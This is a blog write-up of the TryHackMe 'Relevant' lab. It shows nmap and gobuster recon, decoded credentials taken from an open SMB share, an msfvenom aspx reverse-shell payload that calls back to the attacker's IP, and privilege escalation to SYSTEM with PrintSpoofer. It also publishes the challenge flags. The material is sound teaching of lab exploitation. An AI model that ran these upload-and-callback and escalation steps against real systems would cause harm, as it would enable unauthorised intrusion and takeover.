---
layout: post
title: THM — Relevant
date: 2022-10-01 01:00:00 -500
categories: [TryHackMe]
tags: [Gobuster]
---

<img src="/assets/images/THM/Relevant/logo.jpg" width="20%">

***

<center><strong><font color="White">Penetration Testing Challenge</font></strong></center>

***

## <strong><font color="#34A5DA">Pre-Engagement Briefing</font></strong>

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

### Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation:
* User.txt
* Root.txt

Additionally, the client has provided the following scope allowances:
* Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
* Locate and note all vulnerabilities found
* Submit the flags discovered to the dashboard
* Only the IP address assigned to your machine is in scope
* Find and report ALL vulnerabilities (yes, there is more than one path to root)

***

## <strong><font color="#34A5DA">Reccon</font></strong>

First, nmap scan:
```
vladislav@Mac ~ % nmap -sV -sC 10.10.59.114
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-01 18:19 MSK
Nmap scan report for 10.10.59.114
Host is up (0.090s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-10-01T15:20:18+00:00
|_ssl-date: 2022-10-01T15:20:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-09-30T15:04:31
|_Not valid after:  2023-04-01T15:04:31
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-01T08:20:19-07:00
| smb2-time: 
|   date: 2022-10-01T15:20:22
|_  start_date: 2022-10-01T15:04:59

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.26 seconds
```

Searching for vulnerabilities:
```
vladislav@Mac ~ % nmap -sV -sC --script vuln 10.10.59.114                                        
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-01 18:35 MSK
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.59.114
Host is up (0.064s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 303.22 seconds
```

We can a website. Nothing interesting on it. Searching with gobuster didn't result in anything.
```
vladislav@Mac ~ % gobuster dir -u http://10.10.59.114 -w share/wordlists/dirs/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.59.114
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                share/wordlists/dirs/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/01 18:29:26 Starting gobuster in directory enumeration mode
===============================================================
                                
===============================================================
2022/10/01 18:31:54 Finished
===============================================================
```

Let's see smb shares:
```
vladislav@Mac ~ % smbclient -L 10.10.59.114
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [WORKGROUP\vladislav]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

Let's see `nt4wrksv`:
```
vladislav@Mac ~ % smbclient //10.10.59.114/nt4wrksv
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [WORKGROUP\vladislav]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 00:46:04 2020
  ..                                  D        0  Sun Jul 26 00:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 18:15:33 2020

		7735807 blocks of size 4096. 5155994 blocks available
smb: \> cat passwords.txt
cat: command not found
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)
smb: \> put a
putting file a as \a (0,0 kb/s) (average 0,0 kb/s)
smb: \> ls
  .                                   D        0  Sat Oct  1 21:02:16 2022
  ..                                  D        0  Sat Oct  1 21:02:16 2022
  a                                   A        2  Sat Oct  1 21:02:16 2022
  passwords.txt                       A       98  Sat Jul 25 18:15:33 2020

		7735807 blocks of size 4096. 5125594 blocks available
```

So, we downloaded `passwords.txt` which contains:
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Let's decode them:

```
vladislav@Mac ~ % base64 -d passwords.txt 
Bob - !P@$$W0rD!123%
Bill - Juw4nnaM4n420696969!$$$%                                                                                                                        
```

I tried ms017-10 vulnerability after second nmap scan, but it wasn't succesful. Now we can try again adding credentials:
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.83.205
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SMBUser Bob
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SMBPass !P@$$W0rD!123%
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg LHOST 10.18.7.222
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.1.74:4444 
[*] 10.10.83.205:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.10.83.205:445      - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] 10.10.83.205:445      - Scanned 1 of 1 hosts (100% complete)
[-] 10.10.83.205:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set SMBUser Bill
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SMBPass Juw4nnaM4n420696969!$$$%
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

None of this worked.

Searching for all ports I found some more open ports: port `49663` can be accessed via http.

Searching with gobuster:
```
vladislav@Mac ~ % gobuster dir -u http://10.10.83.205:49663 --wordlist=share/wordlists/dirs/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.83.205:49663
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                share/wordlists/dirs/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/01 21:08:58 Starting gobuster in directory enumeration mode
===============================================================
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]
/*http%3A             (Status: 400) [Size: 3420]
/**http%3A            (Status: 400) [Size: 3420]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]
/s%26p                (Status: 400) [Size: 3420]
Progress: 93413 / 220561 (42.35%)              [ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/newsgrpahic5": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/newsgrpahic2": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/32297": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/newsgrpahic7": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/new2bsd": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/rainbow6": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/shogo": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/Facade": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/sewerlinewithout": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:43 [!] Get "http://10.10.83.205:49663/newsgrpahic8": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 93423 / 220561 (42.36%)              [ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/advertise_here": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/bebits": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/WorldMap": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/32072": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/navHomeCurrent": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/cssac": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/32279": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/32090": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/2172744": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:20:53 [!] Get "http://10.10.83.205:49663/apsac": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 93433 / 220561 (42.36%)              [ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/cable_dsl": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/sunday_times-logo": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/botLeft": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/dadvocate": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/picture_service": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/answerman": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/oct2206": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/features_exclusives": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/coolnews": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:03 [!] Get "http://10.10.83.205:49663/004721": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 93443 / 220561 (42.37%)              [ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/rule_trans": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/addPostingForm": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/rthwbuit0010000008ukm": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/headlines_rugouts": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/askthepilot214": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/2169050": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/11746": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/33542": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/148492": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:13 [!] Get "http://10.10.83.205:49663/spacer01": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 93453 / 220561 (42.37%)              [ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/14847": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/grey_pix": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/raze": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/148546": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/2169043": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/148489": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/148490": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/kaz": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/148491": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:23 [!] Get "http://10.10.83.205:49663/bleh": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 93463 / 220561 (42.38%)              [ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/32312": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/bookdetails": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/menu_aboutus": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/nis_logo": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/newventures": dial tcp 10.10.83.205:49663: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/NavImages": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/vanguards": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/newscolumns": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/132922": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2022/10/01 21:21:35 [!] Get "http://10.10.83.205:49663/PUSH": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/%3FRID%3D2671        (Status: 400) [Size: 3420]
/devinmoore*          (Status: 400) [Size: 3420]
/200109*              (Status: 400) [Size: 3420]
/*sa_                 (Status: 400) [Size: 3420]
/*dc_                 (Status: 400) [Size: 3420]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3420]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3420]                   
/http%3A%2F%2Fradar   (Status: 400) [Size: 3420]                                                           
/q%26a2               (Status: 400) [Size: 3420]                                                           
/login%3f             (Status: 400) [Size: 3420]                                                           
/Shakira%20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3420]                                        
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3420]                                                  
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3420]                                                           
/http%3A%2F%2Fswik    (Status: 400) [Size: 3420]                                                           
/nt4wrksv             (Status: 301) [Size: 158] [--> http://10.10.83.205:49663/nt4wrksv/]                  
                                                                                                           
===============================================================
2022/10/01 21:36:52 Finished
===============================================================
```

What interesting here is that we can access `nt4wrksv` — directory we accessed previously via smb. Moreover, as we previously have seen, we can write to shared directory. So, we can upload a payload and run it with this port.

***

## <strong><font color="#34A5DA">Exploitation</font></strong>

Create an aspx shell as it is windows webserver:
```
vladislav@Mac ~ % msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.7.222 LPORT=5566 -f aspx -o payload.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3420 bytes
Saved as: payload.aspx
```

Connect to smb again and upload payload:
```
vladislav@Mac ~ % smbclient //10.10.83.205/nt4wrksv                                                                         
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [WORKGROUP\vladislav]:
Try "help" to get a list of possible commands.
smb: \> put payload.aspx
putting file payload.aspx as \payload.aspx (17,1 kb/s) (average 17,1 kb/s)
```

Start a listener on port 5566 and curl the address.

```
vladislav@Mac ~ % curl http://10.10.83.205:49663/nt4wrksv/payload.aspx
```
We got access:

```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set LHOST 10.18.7.222
msf6 exploit(multi/handler) > set LPORT 5566
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.7.222:5566 
[*] Command shell session 1 opened (10.18.7.222:5566 -> 10.10.83.205:49844) at 2022-10-01 21:43:14 +0300


Shell Banner:
Microsoft Windows [Version 10.0.14393]
-----
          

c:\windows\system32\inetsrv>[*] Command shell session 2 opened (10.18.7.222:5566 -> 10.10.83.205:49845) at 2022-10-01 21:43:19 +0300
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

***

## <strong><font color="#34A5DA">Privilege Escalation</font></strong>



Looking in the Internet for privileges we can find <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> for `SeImpersonatePrivilege` priv.

Upload it with smb:
```
vladislav@Mac ~ % smbclient //10.10.203.98/nt4wrksv
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [WORKGROUP\vladislav]:
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe
putting file PrintSpoofer.exe as \PrintSpoofer.exe (98,5 kb/s) (average 98,5 kb/s)
```

Run it:
```
C:\Windows\system32>whoami
whoami
nt authority\system
```

Now we have root privs and can access flags:
```
C:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}

C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```

> User Flag `THM{fdk4ka34vk346ksxfr21tg789ktf45}`

> Root Flag `THM{1fk5kf469devly1gl320zafgl345pv}`



